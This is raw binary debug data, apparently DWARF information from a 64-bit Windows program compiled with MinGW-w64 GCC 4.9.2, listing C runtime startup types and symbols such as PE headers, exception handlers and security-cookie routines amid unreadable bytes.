  e_magic ²5   e_cblp ³5  e_cp ´5  e_crlc µ5  e_cparhdr ¶5  e_minalloc ·5  
e_maxalloc ¸5  e_ss ¹5  e_sp º5  e_csum »5  e_ip ¼5  e_cs ½5  e_lfarlc ¾5  e_ovno ¿5  e_res À®
  e_oemid Á5  $e_oeminfo Â5  &e_res2 Ã¾
  (e_lfanew ÄÈ  < 5  ¾
  C   5  Î
  C  	 
IMAGE_DOS_HEADER ÅY  
PIMAGE_DOS_HEADER Å  Y  _IMAGE_FILE_HEADER  Ô  Machine !5   NumberOfSections "5  TimeDateStamp #A  PointerToSymbolTable $A  NumberOfSymbols %A  SizeOfOptionalHeader &5  Characteristics '5   
IMAGE_FILE_HEADER (   _IMAGE_DATA_DIRECTORY \4  VirtualAddress ]A   Size ^A   
IMAGE_DATA_DIRECTORY _î  _IMAGE_OPTIONAL_HEADER àc  Magic e5    †   f)   å   g)   {   hA   «   iA     jA   (  kA      lA  BaseOfData mA   q   nA   *   oA    |  pA  $ `  q5  ( Ó  r5  * 
  s5  , Á  t5  . <  u5  0 ;   v5  2 û  wA  4    xA  8 R  yA  < 
   zA  @     {5  D ®  |5  F Á   }A  H _   ~A  L ™   A  P Ô   €A  T ï  A  X Š  ‚A  \ Q   ƒ  ` 4    C   
PIMAGE_OPTIONAL_HEADER32 „?  Q  _IMAGE_OPTIONAL_HEADER64 ð–ð  Magic —5    †   ˜)   å   ™)   {   šA   «   ›A     œA   (  A      žA   q   Ÿ	   *    A    |  ¡A  $ `  ¢5  ( Ó  £5  * 
  ¤5  , Á  ¥5  . <  ¦5  0 ;   §5  2 û  ¨A  4    ©A  8 R  ªA  < 
   «A  @     ¬5  D ®  ­5  F Á   ®	  H _   ¯	  P ™   °	  X Ô   ±	  ` ï  ²A  h Š  ³A  l Q   ´  p 
IMAGE_OPTIONAL_HEADER64 µE  
PIMAGE_OPTIONAL_HEADER64 µ1  E  	_IMAGE_NT_HEADERS64 Ì•  Signature ÍA   FileHeader ÎÔ  OptionalHeader Ïð   
PIMAGE_NT_HEADERS64 Ð±  7  
PIMAGE_NT_HEADERS ß•  
PIMAGE_TLS_CALLBACK í  ó    ®  A  ®     È    Û
   HINSTANCE__ ÐA  unused Ð    HINSTANCE ÐR    PTOP_LEVEL_EXCEPTION_FILTER   LPTOP_LEVEL_EXCEPTION_FILTER X  _STARTUPINFOA h	õ  cb 	 A   lpReserved 	!Û  lpDesktop 	"Û  lpTitle 	#Û  dwX 	$A   dwY 	%A  $dwXSize 	&A  (dwYSize 	'A  ,dwXCountChars 	(A  0dwYCountChars 	)A  4dwFillAttribute 	*A  8dwFlags 	+A  <wShowWindow 	,5  @cbReserved2 	-5  BlpReserved2 	.]  HhStdInput 	/é  PhStdOutput 	0é  XhStdError 	1é  ` STARTUPINFOA 	2Ÿ  STARTUPINFO 	Iõ  '  tagCOINITBASE 
•T  COINITBASE_MULTITHREADED    VARENUM 
 è  VT_EMPTY  VT_NULL VT_I2 VT_I4 VT_R4 VT_R8 VT_CY VT_DATE  VT_BSTR VT_DISPATCH 	VT_ERROR 
VT_BOOL 
VT_VARIANT VT_UNKNOWN 
VT_DECIMAL VT_I1 VT_UI1 VT_UI2 VT_UI4 VT_I8 VT_UI8 VT_INT VT_UINT VT_VOID VT_HRESULT VT_PTR VT_SAFEARRAY VT_CARRAY VT_USERDEFINED VT_LPSTR VT_LPWSTR VT_RECORD $VT_INT_PTR %VT_UINT_PTR &VT_FILETIME À VT_BLOB Á VT_STREAM Â VT_STORAGE Ã VT_STREAMED_OBJECT Ä VT_STORED_OBJECT Å VT_BLOB_OBJECT Æ VT_CF Ç VT_CLSID È VT_VERSIONED_STREAM É VT_BSTR_BLOB ÿVT_VECTOR € VT_ARRAY €À VT_BYREF €€VT_RESERVED €€VT_ILLEGAL ÿÿVT_ILLEGALMASKED ÿVT_TYPEMASK ÿ _PVFV    _PIFV Þ  !’  newmode “    _startupinfo ”  "ø   o  __uninitialized  __initializing __initialized  #ø   Ÿ/  _exception (
¨Ñ  type 
©   name 
ªÑ  arg1 
«é  arg2 
¬é  retval 
­é    ×     
_TCHAR ²   $__readgsqword …³   "  %Offset …O  &ret …³    '_TEB (NtCurrentTeb Ÿ >  "  $_InterlockedCompareExchangePointer ò%  ¬  %Destination ò¬  %ExChange ò%  %Comperand ò%   ²  )%  $_InterlockedExchangePointer û%  þ  %Target û¬  %Value û%   *duplicate_ppstrings œ^  %ac œ  %av œ^  &avl ž  &i Ÿ  &n    +&l ¥¥       ,__mingw_invalidParameterHandler q @            œô  -expression qP   R-function rP   Q-file sP   X-line t3  Y-pReserved uÞ   ‘  .check_managed_app ]  a  &pDOSHeader _ç
  &pPEHeader `·  &pNTHeader32 a  &pNTHeader64 b   /pre_c_init ~  @     A      œ,  0ô  @         €Ç  1    2  3&      38  6   3L  p     4u@     %  Þ  5R2 4@     ›%  ö  5R	ÿ 6¯@     ¼%  4Ì@     %    5R1 7,@     Ì%  8R  ,pre_cpp_init ›`@     N       œ–  7£@     
&  5R	(p@     5Q	 p@     5X	p@     5w 	 p@       /__tmainCRTStartup Þ  °@           œÕ   9lpszCommandLine àÕ   •   :StartupInfo á	  ‘Ð~9inDoubleQuote â  à   ;@   Ã   9lock_free ó%  U  9fiberid ô%  y  9nested õ  ¯  <(  å@            ô¬  =ë  å@            Ÿ >  3  ?å@            3  m     0D  ù@     €   öÛ  >™    >ˆ  È  @t   Aþ  =@     °   C“  >&  þ  >  F  1°   31  |  3=  ²  3G  ý  Bp@     -       }  3R  Y  6y@     D&  4…@     \&  h  5Rt  7@     u&  5Xt   7Q@     \&  5R}    C·  €@            ¾  >ï  |  @à   D@     Ó  5R
è Dx@     ð  5R05Q25X0 6}@     •&  DŠ@        8R 6™@     ²&  4¥@     Ï&  :   5R	 @      6ª@     ÿ&  6»@     
'  6è@     '  6
@     5'  4Q@     ?'  …   5RO 4o@     W'     8R8Q 4¹@     W'  µ   8R8Q 6Î@     s'   E™@     5R‘Ð~  Ü  FWinMainCRTStartup ª  Ð@     "       œ4!  9ret ¬     6æ@     †'  6ë@     –   FmainCRTStartup Æ   @     "       œŠ!  9ret È  Ø  6@     †'  6@     –   :argc K  	(p@     :argv Q  	 p@     :envp R  	p@     :argret U  	p@     :mainret V  	p@     :managedapp W  	p@     :has_cctor X  	p@     :startinfo Y  	 p@     G__globallocalestatus L  G__imp__fmode --  G_dowildcard 4  G_newmode n  G__imp___initenv v^  G__imp__acmdln {  G__native_startup_state ¡ì"  )o  G__native_startup_lock ¢#  #  HG__image_base__ 'Î
  G__imp__commode 2-  G_fmode 1  õ  Z#  I G__xi_a :O#  G__xi_z ;O#  è  #  I G__xc_a <v#  G__xc_z =v#  G__dyn_tls_init_callback @¼#  Ñ  G__onexitbegin BÖ#  è  G__onexitend CÖ#  Gmingw_app_type E  J__mingw_winmain_hInstance GA  	z@     J__mingw_winmain_lpCmdLine HÕ   	z@     J__mingw_winmain_nShowCmd IA  	 0@     G__mingw_oldexcpt_handler Z{  Jmingw_pcinit fõ  	 @     Jmingw_pcppinit gè  	@     G_MINGW_INSTALL_DEBUG_MATHERR i  Kmingw_initltsdrot_force W  Kmingw_initltsdyn_force X  Kmingw_initltssuo_force Y  Kmingw_initcharmax Z  L__set_app_type §›%     M_encode_pointer ®%  ¼%  %   N_setargv ˆ  L__mingw_setusermatherr 
²ð%  ð%   ö%    &  &   z  M__getmainargs —  >&  -  ^  ^    >&     Mstrlen 6¥   \&  Ñ   Omalloc  ¹%  u&  ¥    Pmemcpy %  •&  %  k  C   Q_pei386_runtime_relocator \N__mingw_init_ehandler Ã  M_set_invalid_parameter_handler  ‰	   ÿ&  	    Q_fpreset )Q__main LMmain   5'         Q_cexit 7L_amsg_exit †W'     L_initterm 6s'  Ö#  Ö#   Rexit  2†'     Q__security_init_cookie i à   3  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/mingw_helpers.c °@            1  char  long long unsigned int long long int  short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char float signed char short int double long double tagCOINITBASE •´  COINITBASE_MULTITHREADED   VARENUM  H  VT_EMPTY  VT_NULL VT_I2 VT_I4 VT_R4 VT_R8 VT_CY VT_DATE  VT_BSTR VT_DISPATCH 	VT_ERROR 
VT_BOOL 
VT_VARIANT VT_UNKNOWN 
VT_DECIMAL VT_I1 VT_UI1 VT_UI2 VT_UI4 VT_I8 VT_UI8 VT_INT VT_UINT VT_VOID VT_HRESULT VT_PTR VT_SAFEARRAY VT_CARRAY VT_USERDEFINED VT_LPSTR VT_LPWSTR VT_RECORD $VT_INT_PTR %VT_UINT_PTR &VT_FILETIME À VT_BLOB Á VT_STREAM Â VT_STORAGE Ã VT_STREAMED_OBJECT Ä VT_STORED_OBJECT Å VT_BLOB_OBJECT Æ VT_CF Ç VT_CLSID È VT_VERSIONED_STREAM É VT_BSTR_BLOB ÿVT_VECTOR € VT_ARRAY €À VT_BYREF €€VT_RESERVED €€VT_ILLEGAL ÿÿVT_ILLEGALMASKED ÿVT_TYPEMASK ÿ  _decode_pointer B  °@            œˆ  codedptr B  R  _encode_pointer B  À@            œÃ  ptr B  R 	mingw_app_type í   	0p@      ™   º  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/dllargv.c Ð@              char  long long unsigned int long long int  short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char float signed char short int double long double _setargv ç   Ð@            œ Y    ñ  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/merr.c à@     \        double char  long long unsigned int long long int  short unsigned int int long int ¥    unsigned int  sizetype  long unsigned int unsigned char float signed char short int long double tagCOINITBASE •¯  COINITBASE_MULTITHREADED   VARENUM  C  VT_EMPTY  VT_NULL VT_I2 VT_I4 VT_R4 VT_R8 VT_CY VT_DATE  VT_BSTR VT_DISPATCH 	VT_ERROR 
VT_BOOL 
VT_VARIANT VT_UNKNOWN 
VT_DECIMAL VT_I1 VT_UI1 VT_UI2 VT_UI4 VT_I8 VT_UI8 VT_INT VT_UINT VT_VOID VT_HRESULT VT_PTR VT_SAFEARRAY VT_CARRAY VT_USERDEFINED VT_LPSTR VT_LPWSTR VT_RECORD $VT_INT_PTR %VT_UINT_PTR &VT_FILETIME À VT_BLOB Á VT_STREAM Â VT_STORAGE Ã VT_STREAMED_OBJECT Ä VT_STORED_OBJECT Å VT_BLOB_OBJECT Æ VT_CF Ç VT_CLSID È VT_VERSIONED_STREAM É VT_BSTR_BLOB ÿVT_VECTOR € VT_ARRAY €À VT_BYREF €€VT_RESERVED €€VT_ILLEGAL ÿÿVT_ILLEGALMASKED ÿVT_TYPEMASK ÿ  _iobuf 0XÊ  _ptr Y   _cnt Zî   _base [  _flag \î   _file ]î   _charbuf ^î    _bufsiz _î   $_tmpfname `  ( 	FILE bC   _exception (¨-  type ©î    name ª-  arg1 «›   arg2 ¬›   retval ­›     3  
¥   	fUserMathErr 
L  R  
î   a  a   Ö  
__mingw_raise_matherr °à@     A       œþ  typ î     name -  ]  a1 ›   –  a2 ›   Ò  rslt ›   ‘ ex Ö  ‘@@     R‘@  
__mingw_setusermatherr ²0@            œQ  f L    <@     
   RóR  _matherr î   @@     ü       œë  pexcept %a  G  type '-  “  ™@     (   Ã@     @   Q	(A@     Xs Yt w õ›w(õ›w0õ›  stUserMathErr 8  	@p@     __setusermatherr ³(   L   __iob_func T:   Ê  fprintf yî   :   -    ½   k  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/pseudo-reloc.c @@     Ù      Ô  __gnuc_va_list ¹   __builtin_va_list Ñ   char va_list £   size_t #ö    long long unsigned int long long int ptrdiff_t X   short unsigned int int long int Ñ    unsigned int  sizetype  long unsigned int unsigned char BYTE ‹’  WORD Œ2  DWORD }  float PBYTE à  ¥  LPBYTE ‘à  LPVOID ™£     signed char short int ULONG_PTR 1ö   SIZE_T “%  PVOID ú£  double long double _MEMORY_BASIC_INFORMATION 0  	BaseAddress D   	AllocationBase D  	AllocationProtect ½  	RegionSize 6  	State ½   	Protect  ½  $	Type !½  ( 
MEMORY_BASIC_INFORMATION "j  
¥  I  q    
;  PhysicalAddress <½  VirtualSize =½   _IMAGE_SECTION_HEADER (9“  	Name :9   	Misc >I  	VirtualAddress ?½  	SizeOfRawData @½  	PointerToRawData A½  	PointerToRelocations B½  	PointerToLinenumbers C½  	NumberOfRelocations D±   	NumberOfLinenumbers E±  "	Characteristics F½  $ 
PIMAGE_SECTION_HEADER G±    tagCOINITBASE  •é  COINITBASE_MULTITHREADED   VARENUM  }   VT_EMPTY  VT_NULL VT_I2 VT_I4 VT_R4 VT_R8 VT_CY VT_DATE  VT_BSTR VT_DISPATCH 	VT_ERROR 
VT_BOOL 
VT_VARIANT VT_UNKNOWN 
VT_DECIMAL VT_I1 VT_UI1 VT_UI2 VT_UI4 VT_I8 VT_UI8 VT_INT VT_UINT VT_VOID VT_HRESULT VT_PTR VT_SAFEARRAY VT_CARRAY VT_USERDEFINED VT_LPSTR VT_LPWSTR VT_RECORD $VT_INT_PTR %VT_UINT_PTR &VT_FILETIME À VT_BLOB Á VT_STREAM Â VT_STORAGE Ã VT_STREAMED_OBJECT Ä VT_STORED_OBJECT Å VT_BLOB_OBJECT Æ VT_CF Ç VT_CLSID È VT_VERSIONED_STREAM É VT_BSTR_BLOB ÿVT_VECTOR € VT_ARRAY €À VT_BYREF €€VT_RESERVED €€VT_ILLEGAL ÿÿVT_ILLEGALMASKED ÿVT_TYPEMASK ÿ _iobuf 0	  _ptr 	[   _cnt 	H  _base 	[  _flag 	H  _file 	H  _charbuf 	 H   _bufsiz 	!H  $_tmpfname 	"[  ( FILE 	$}   ;7  addend <½   target =½   runtime_pseudo_reloc_item_v1 >  F  sym G½   target H½  flags I½   runtime_pseudo_reloc_item_v2 J[  Lè  magic1 M½   magic2 N½  version O½   runtime_pseudo_reloc_v2 P±    ©G	  old_protect «½   sec_start ¬Ó  hash ­“     ® 	  __write_memory 	  addr £  src   len è    do_pseudo_reloc 3=
  start 3£  end 3£  base 3£  addr_imp 5!  reldata 5!  reloc_target 6!  v2_hdr 7=
  r 8C
  o hI
  newval m½     è    7  __report_error S@@     a       œ
  msg S
  B   argp ’Ù   ‘Xg@     ½   ‚@     Õ  Ì
  !R	pA@     !Q1!XK Œ@     ½   ›@     
  ÷
  !Qs !Xt  ¡@     2   

  "Ñ   #mark_section_writable ´V
  $addr ´ô  %b ¶  %h ·“  %i ¸H   &R	  °@     b      œ¦  'j	  x   'w	  ý   'ƒ	  ‚  (
  ¼@     à   
‚  '.
  ô  )à   *:
  ‘+C
  y	  +L
  è	   @     <  å
  !Rs  C@     j  ,l@     
  !Q‘!X0 ,¥@     !  !X@  å@     O
  @  !R	èA@       @     O
  _  !R	°A@      -@     O
  !R	A@     !Qs    .Ê@       !RóR!QóQ!XóX  #restore_modified_sections ßê  %i áH  %b â  %oldprot ã½   /_pei386_runtime_relocator Ð @     ù      œ  0was_init ÒH  	Pp@     1mSecs ÔH  3
  (	  v@        à‹  2©	  2·	  2Ã	  )   +Ð	  V
  *á	  ‘+ñ	  h
  +
  ƒ  +
  Î  (R	  @     p  Áñ
  'ƒ	  
  'w	  (
  'j	  K
  -¦@     V
  !Qu !X2  (R	  P@     À  È>  'ƒ	  n
  'w	  ’
  'j	  µ
  -k@     V
  !Qu !X8  3 @     =       µ  + 
  Ø
  )   *+
  ‘4R	  @     0  p'ƒ	  #  'w	  G  'j	  j  -3@     V
  !Qu !X4    (R	  E@     `  ¾  'ƒ	    'w	  ±  'j	  Ô  -q@     V
  !Qu !X1  (R	  Á@        ÄO  'ƒ	  ÷  'w	    'j	  >  -é@     V
  !Qu !X4   ¿@     O
  n  !R	HB@      -@     O
  !R	B@        (¦  z@     à  é  )à  +È  a  *Ñ  ‘*Ú  ‘Œ,Ó@     Ý  !Qu !X0 ,õ@     ñ  !Y}  -@     O
  !R	°A@        _@     ¡   the_secs °6  	Xp@     G	  maxSections ±H  	Tp@     5__RUNTIME_PSEUDO_RELOC_LIST__ 0Ñ   5__RUNTIME_PSEUDO_RELOC_LIST_END__ 1Ñ   5__image_base__ 2Ñ   6__iob_func 	TÏ    7__builtin_fwrite 
 fwrite ö   
  8  8ö   8ö   8£   9vfprintf 	}H  2  8Ï  8
  8Ù    :abort 
@;__mingw_GetSectionForAddress ¦“  j  8ô   6_GetPEImageBase §Ó  <memcpy £  ¡  8£  8  8q   6__mingw_GetSectionCount ¥H   J   	  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/crt_handler.c  @     X        char size_t #¸    long long unsigned int long long int  short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char T  _  ù    e   _EXCEPTION_RECORD ˜‘	  ExceptionCode ’	   ExceptionFlags “	  	B  ”	_  ExceptionAddress •	  NumberParameters –	  ExceptionInformation —	·	    
  
_CONTEXT Ð  P1Home ‚€   P2Home ƒ€  P3Home „€  P4Home …€  P5Home †€   P6Home ‡€  (ContextFlags ˆ  0MxCsr ‰  4SegCs Š  8SegDs ‹  :SegEs Œ  <SegFs   >SegGs Ž  @SegSs   BEFlags   DDr0 ‘€  HDr1 ’€  PDr2 “€  XDr3 ”€  `Dr6 •€  hDr7 –€  pRax —€  xRcx ˜€  €Rdx ™€  ˆRbx š€  Rsp ›€  ˜Rbp œ€   Rsi €  ¨Rdi ž€  °R8 Ÿ€  ¸R9  €  ÀR10 ¡€  ÈR11 ¢€  ÐR12 £€  ØR13 ¤€  àR14 ¥€  èR15 ¦€  ðRip §€  øñ   
VectorRegister À#	   
VectorControl Á€   
DebugControl Â€  ¨
LastBranchToRip Ã€  °
LastBranchFromRip Ä€  ¸
LastExceptionToRip Å€  À
LastExceptionFromRip Æ€  È BYTE ‹=  WORD Œã   DWORD (  float PBYTE ?    LPBYTE ‘?  signed char short int ULONG_PTR 1¸   DWORD64 Â¸   PVOID ú  LONG    LONGLONG ãÒ   ULONGLONG ä¸    _M128A Dø  Low Eº   High F©   M128A GÌ  ø        ø  &       6    _ double long double 
_XMM_SAVE_AREA32  l®   ControlWord m   StatusWord n  TagWord o  Reserved1 p  ErrorOpcode q  ErrorOffset r  ErrorSelector s  Reserved2 t  DataOffset u  DataSelector v  Reserved3 w  MxCsr x  MxCsr_Mask y  FloatRegisters z   XmmRegisters {   
Reserved4 |&    XMM_SAVE_AREA32 }O   «á  Header ¬á   Legacy ­   Xmm0 ®ø   Xmm1 ¯ø  °Xmm2 °ø  ÀXmm3 ±ø  ÐXmm4 ²ø  àXmm5 ³ø  ð
Xmm6 ´ø   
Xmm7 µø  
Xmm8 ¶ø   
Xmm9 ·ø  0
Xmm10 ¸ø  @
Xmm11 ¹ø  P
Xmm12 ºø  `
Xmm13 »ø  p
Xmm14 ¼ø  €
Xmm15 ½ø   ø  ñ      ¨#	  FltSave ©®   FloatSave ª®   Æ    ø  3	     PCONTEXT Ç   _RUNTIME_FUNCTION Ëž	  BeginAddress Ì   EndAddress Í  UnwindData Î   RUNTIME_FUNCTION ÏD	  o  Ç	     EXCEPTION_RECORD ˜	e  PEXCEPTION_RECORD š	ú	  Ç	   _EXCEPTION_POINTERS ¯	8
  	B  °	à	   	(  ±	3	   EXCEPTION_POINTERS ²	 
   
    i
      ;Ÿ
  PhysicalAddress <  VirtualSize =    _IMAGE_SECTION_HEADER (9³
  Name :Y
   Misc >i
  VirtualAddress ?  SizeOfRawData @  PointerToRawData A  PointerToRelocations B  PointerToLinenumbers C  NumberOfRelocations D   NumberOfLinenumbers E  "Characteristics F  $ PIMAGE_SECTION_HEADER GÑ
  Ÿ
  Ý
  œ  ì
  S
   PTOP_LEVEL_EXCEPTION_FILTER ×
  LPTOP_LEVEL_EXCEPTION_FILTER ì
  tagCOINITBASE  •e  COINITBASE_MULTITHREADED   VARENUM  ù  VT_EMPTY  VT_NULL VT_I2 VT_I4 VT_R4 VT_R8 VT_CY VT_DATE  VT_BSTR VT_DISPATCH 	VT_ERROR 
VT_BOOL 
VT_VARIANT VT_UNKNOWN 
VT_DECIMAL VT_I1 VT_UI1 VT_UI2 VT_UI4 VT_I8 VT_UI8 VT_INT VT_UINT VT_VOID VT_HRESULT VT_PTR VT_SAFEARRAY VT_CARRAY VT_USERDEFINED VT_LPSTR VT_LPWSTR VT_RECORD $VT_INT_PTR %VT_UINT_PTR &VT_FILETIME À VT_BLOB Á VT_STREAM Â VT_STORAGE Ã VT_STREAMED_OBJECT Ä VT_STORED_OBJECT Å VT_BLOB_OBJECT Æ VT_CF Ç VT_CLSID È VT_VERSIONED_STREAM É VT_BSTR_BLOB ÿVT_VECTOR € VT_ARRAY €À VT_BYREF €€VT_RESERVED €€VT_ILLEGAL ÿÿVT_ILLEGALMASKED ÿVT_TYPEMASK ÿ __p_sig_fn_t 	0N  _UNWIND_INFO ª  VersionAndFlags    PrologSize   CountOfUnwindCodes   FrameRegisterAndOffset   AddressOfExceptionHandler     UNWIND_INFO !
  __mingw_SEH_error_handler ^ù    @     ¦      œž  B  ^_  «  EstablisherFrame _  ˆ  (  `  e  DispatcherContext a  B  action cù      6  dN     R  eù   Ù  !g@     ¼  —  "R;"Q0 #@     ª  "R; !»@     ¼  Æ  "R8"Q0 #Õ@     Ù  "R8 !ú@     ¼  õ  "R4"Q0 #@       "R4 !G@     ¼  $  "R8"Q1 $L@     Ù  !l@     ¼  M  "R8"Q0 !ˆ@     ¼  i  "R8"Q1 !©@     ¼  …  "R4"Q1 %¿@     ¼  "R;"Q1  __mingw_init_ehandler 3ù   Ð@     ì       œ€  &was_here 5ù   	ˆp@     e 6ª   a  pSec 7³
  ¬  _ImageBase 82  â  $ß@     å  ! @     ü  J  "R	€B@      !ˆ@     -  b  "Rt  '°@     "R	Àq@     "Xv   _gnu_exception_handler Â   À@     ¸      œ6  exception_data Â6  +   6  ÄN  8  action Å   Í   R  Æù   ª  !@     ¼    "R;"Q0 #3@     -  "R; (i@     B  "RóR !“@     ¼  ^  "R8"Q0 !¨@     ¼  z  "R8"Q1 $­@     Ù  !¾@     ¼  £  "R8"Q0 #Ð@     ¶  "R8 ! @     ¼  Ò  "R4"Q0 #( @     å  "R4 !A @     ¼    "R8"Q1 !_ @     ¼    "R;"Q1 %s @     ¼  "R4"Q1  8
  ž	  L     &emu_pdata /<  	Àq@     ª  w     &emu_xdata 0g  	Àp@     )__mingw_oldexcpt_handler º  	€p@     *signal 	<ù  Ù  ù   ù   +_fpreset [,_GetPEImageBase &2  *_FindPESectionByName $³
  "  "   (  -¢   ._FindPESectionExec %³
  ª     º    ñ
  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/CRT_fp10.c € @            þ	  _fpreset 	€ @            œ ¤     GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/gccmain.c  @     ¼       p
  char  long long unsigned int long long int ptrdiff_t XÀ    short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char float signed char short int double long double ‘  tagCOINITBASE •Ä   COINITBASE_MULTITHREADED   VARENUM  X   VT_EMPTY   VT_NULL  VT_I2  VT_I4  VT_R4  VT_R8  VT_CY  VT_DATE   VT_BSTR  VT_DISPATCH 	 VT_ERROR 
 VT_BOOL 
 VT_VARIANT  VT_UNKNOWN 
 VT_DECIMAL  VT_I1  VT_UI1  VT_UI2  VT_UI4  VT_I8  VT_UI8  VT_INT  VT_UINT  VT_VOID  VT_HRESULT  VT_PTR  VT_SAFEARRAY  VT_CARRAY  VT_USERDEFINED  VT_LPSTR  VT_LPWSTR  VT_RECORD $ VT_INT_PTR % VT_UINT_PTR & VT_FILETIME À  VT_BLOB Á  VT_STREAM Â  VT_STORAGE Ã  VT_STREAMED_OBJECT Ä  VT_STORED_OBJECT Å  VT_BLOB_OBJECT Æ  VT_CF Ç  VT_CLSID È  VT_VERSIONED_STREAM É  VT_BSTR_BLOB ÿ VT_VECTOR €  VT_ARRAY €À  VT_BYREF €€ VT_RESERVED €€ VT_ILLEGAL ÿÿ VT_ILLEGALMASKED ÿ VT_TYPEMASK ÿ func_ptr 
‹  	__do_global_dtors  @     5       œ§  
p §  	0@      X  	__do_global_ctors  Ð @     U       œ  
nptrs "'  2  
i #'  Ž  !@     ’  
R	 @       __main 50!@            œ@  L!@     ­   
initialized 2ø   	@s@     X  h   __CTOR_LIST__ ]  __DTOR_LIST__ 
]  atexit Tø   ‹    u   /
  GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/gs_support.c P!@     Û      ‹
  char  long long unsigned int long long int  short unsigned int int long int  unsigned int  sizetype  long unsigned int unsigned char double float long double g  _EXCEPTION_RECORD ˜‘	  ExceptionCode ’	   ExceptionFlags “	  \  ”	a  ExceptionAddress •	†  NumberParameters –	  ExceptionInformation —	K
       _CONTEXT Ð  P1Home ‚w   P2Home ƒw  P3Home „w  P4Home …w  P5Home †w   P6Home ‡w  (ContextFlags ˆ  0MxCsr ‰  4SegCs Š  8SegDs ‹  :SegEs Œ  <SegFs   >SegGs Ž  @SegSs   BEFlags   DDr0 ‘w  HDr1 ’w  PDr2 “w  XDr3 ”w  `Dr6 •w  hDr7 –w  pRax —w  xRcx ˜w  €Rdx ™w  ˆRbx šw  Rsp ›w  ˜Rbp œw   Rsi w  ¨Rdi žw  °R8 Ÿw  ¸R9  w  ÀR10 ¡w  ÈR11 ¢w  ÐR12 £w  ØR13 ¤w  àR14 ¥w  èR15 ¦w  ðRip §w  ø	n	   
VectorRegister À 	   
VectorControl Áw   
DebugControl Âw  ¨
LastBranchToRip Ãw  °
LastBranchFromRip Äw  ¸
LastExceptionToRip Åw  À
LastExceptionFromRip Æw  È 
BYTE ‹.  
WORD ŒÔ   
DWORD   signed char short int 
UINT_PTR /©   
ULONG_PTR 1©   
ULONG64 Á©   
DWORD64 Â©   
PVOID ú  LONG ñ   LONGLONG ãÃ   ULONGLONG ä©   
óë  LowPart ô   l  õ“   
÷  LowPart ø   l  ù“   _LARGE_INTEGER òL  Ã  u úë  QuadPart ü    LARGE_INTEGER ý  _M128A DŽ  Low E±   High F    M128A Gb  Ž  ¬  
    Ž  ¼  
     Ì  
  _ _XMM_SAVE_AREA32  l+  ControlWord m   StatusWord n  TagWord o  Reserved1 p  ErrorOpcode q  ErrorOffset r  ErrorSelector s  Reserved2 t  DataOffset u  DataSelector v  Reserved3 w  MxCsr x  MxCsr_Mask y  FloatRegisters zœ   XmmRegisters {¬   
Reserved4 |¼    XMM_SAVE_AREA32 }Ì   «^	  Header ¬^	   Legacy ­œ   Xmm0 ®Ž   Xmm1 ¯Ž  °Xmm2 °Ž  ÀXmm3 ±Ž  ÐXmm4 ²Ž  àXmm5 ³Ž  ð
Xmm6 ´Ž   
Xmm7 µŽ  
Xmm8 ¶Ž   
Xmm9 ·Ž  0
Xmm10 ¸Ž  @
Xmm11 ¹Ž  P
Xmm12 ºŽ  `
Xmm13 »Ž  p
Xmm14 ¼Ž  €
Xmm15 ½Ž   Ž  n	  
    ¨ 	  FltSave ©+  FloatSave ª+  C   Ž  °	  
   CONTEXT Ç  PCONTEXT Ç  _RUNTIME_FUNCTION Ë+
  BeginAddress Ì   EndAddress Í  UnwindData Î   PRUNTIME_FUNCTION ÏE
  Ñ	  W  [
  
   EXCEPTION_RECORD ˜	g  PEXCEPTION_RECORD š	Ž
  [
  _EXCEPTION_POINTERS ¯	Ö
  \  °	t
   ContextRecord ±	À	   EXCEPTION_POINTERS ²	”
  _FILETIME Þ1
  dwLowDateTime ß   dwHighDateTime à   
FILETIME áñ
  
NTSTATUS “  |
  ft_scalar !©   ft_struct "1
   
FT #Q
  __security_init_cookie 2P!@     Ö       œ  cookie 4G  Ù  systime 5|
  ‘°perfctr 6L  ‘@›!@       R‘° Ã!@     R‘@  __report_gsfailure g0"@     û       œ—
  StackCookie gW  '  cookie i§
  ‘PcontrolPC kh  SimgBase kh  ‘¸establisherFrame kh  ‘@fctEntry l+
  ]  hndData m†  ‘HJ"@     é  R	€s@      a"@     
  Rs QvhX0 £"@     C
  R0Xs w 	€s@     w(vxw0vpw80 ê"@     V
  R0 ÷"@     q
  R	B@      
#@     ‰
  Q‰ˆ€€|  #@     n   G  §
  
   !—
  GS_ExceptionRecord %[
  	€x@     GS_ContextRecord &°	  	€s@     GS_ExceptionPointers (  	B@     "Ö
  #__security_cookie ,G  	p0@     #__security_cookie_complement -G  	€0@     $abort @ ×      GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/tlssup.c 0#@     £       ¿  char  long long unsigned int long long int uintptr_t K¥    short unsigned int int long int     unsigned int  sizetype  long unsigned int unsigned char ULONG ,  WINBOOL ÷   BOOL ƒ÷   DWORD ,  float LPVOID ™R  signed char short int ULONG_PTR 1¥   PVOID úR  HANDLE ŽR  ULONGLONG ä¥   double long double    PIMAGE_TLS_CALLBACK 7  =  R  	Í  	|  	Í   
_IMAGE_TLS_DIRECTORY64 (  
StartAddressOfRawData é   
EndAddressOfRawData é  
AddressOfIndex é  
AddressOfCallBacks é  
